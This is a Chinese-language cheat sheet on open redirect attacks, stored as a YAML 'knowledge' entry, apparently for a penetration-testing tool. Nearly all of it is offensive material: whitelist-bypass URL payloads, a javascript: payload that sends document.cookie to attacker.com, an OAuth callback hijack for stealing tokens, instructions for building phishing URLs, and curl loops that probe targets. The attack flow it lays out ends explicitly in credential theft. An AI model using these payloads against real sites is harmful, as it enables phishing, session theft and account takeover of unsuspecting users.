knowledge: |
  # 开放重定向攻击

  ## 攻击思路
  ```
  识别重定向参数 → 绕过白名单验证 → 构造钓鱼URL → 用户信任点击 → 凭据窃取
  ```

  ## 常见重定向入口

  | 入口类型 | 参数示例 |
  |----------|----------|
  | URL参数 | ?url=, ?redirect=, ?next=, ?return= |
  | Cookie参数 | Cookie中的redirect_url |
  | Header参数 | Referer/X-Forwarded-Host |
  | POST参数 | redirect_uri, callback |

  ```bash
  # 常见重定向参数
  /redirect?url=http://attacker.com
  /login?next=http://attacker.com
  /logout?return=/dashboard
  /auth?callback=http://attacker.com
  ```

  ## 绕过技术矩阵

  | 绕过类型 | Payload | 适用场景 |
  |----------|---------|----------|
  | @符号 | http://target.com@attacker.com | URL解析差异 |
  | 编码绕过 | http://target.com%2f@attacker.com | URL编码 |
  | 反斜杠 | http://target.com\@attacker.com | Windows/IIS |
  | 子域名 | http://target.com.attacker.com | 子域名归属 |
  | 反向 | http://attacker.com/target.com | 正则匹配漏洞 |
  | 路径遍历 | /redirect?url=../attacker | 相对路径 |
  | 特殊字符 | http://attacker.com#target.com | #后内容被忽略 |

  ### @符号绕过原理
  ```
  http://target.com@attacker.com
  实际访问: attacker.com
  target.com被解析为用户名部分
  ```

  ### 编码绕过
  ```
  http://target.com%2f@attacker.com   (%2f = /)
  http://target.com%5c@attacker.com   (%5c = \)
  http://%74%61%72%67%65%74%2e%63%6f%6d  (Hex编码)
  ```

  ### 子域名绕过
  ```
  # 注册 target.com.attacker.com
  http://target.com.attacker.com
  正则: ^https?://.*target\.com  → 匹配成功但实际访问attacker
  ```

  ## JavaScript重定向

  ```javascript
  // 协议重定向
  ?url=javascript:alert(document.domain)
  ?url=javascript:fetch('http://attacker.com/'+document.cookie)

  // Data协议
  ?url=data:text/html,<script>alert(1)</script>

  // VBScript(IE)
  ?url=vbscript:msgbox(1)
  ```

  ## 组合攻击链

  | 组合攻击 | 效果 |
  |----------|------|
  | 重定向+XSS | ?url=javascript:alert(1) |
  | 重定向+SSRF | 重定向到内网/元数据服务 |
  | 重定向+OAuth | 劫持OAuth回调获取Token |
  | 重定向+钓鱼 | 伪造登录页面窃取凭据 |

  ### OAuth重定向劫持
  ```
  1. 正常OAuth流程: /auth?callback=https://target.com/oauth/callback
  2. 修改callback: /auth?callback=https://attacker.com/oauth/callback
  3. 用户授权 → Token发送到attacker.com
  4. 攻击者获取用户Token
  ```

  ## 钓鱼攻击利用

  ```
  # 构造钓鱼URL
  https://trusted-site.com/login?next=https://trusted-site.com%40attacker.com

  用户看到: trusted-site.com
  实际重定向: attacker.com钓鱼页面

  钓鱼页面可以:
  - 伪造trusted-site.com登录界面
  - 窃取用户凭据
  - 带有trusted-site.com的URL增加可信度
  ```

  ## 漏洞检测

  ```bash
  # 基础测试
  curl -v "http://target/redirect?url=http://attacker.com"

  # 绕过测试
  for payload in "@attacker.com" "%2f@attacker.com" ".attacker.com"; do
    curl -v "http://target/redirect?url=http://target.com$payload"
  done
  ```

  ## 常见过滤缺陷

  | 过滤方式 | 绕过Payload |
  |----------|-------------|
  | 包含target | http://target.com.attacker.com |
  | 结尾target | http://attacker.com/target.com |
  | 正则匹配漏洞 | http://target.com@attacker.com |
  | 黑名单过滤 | 子域名/编码变体 |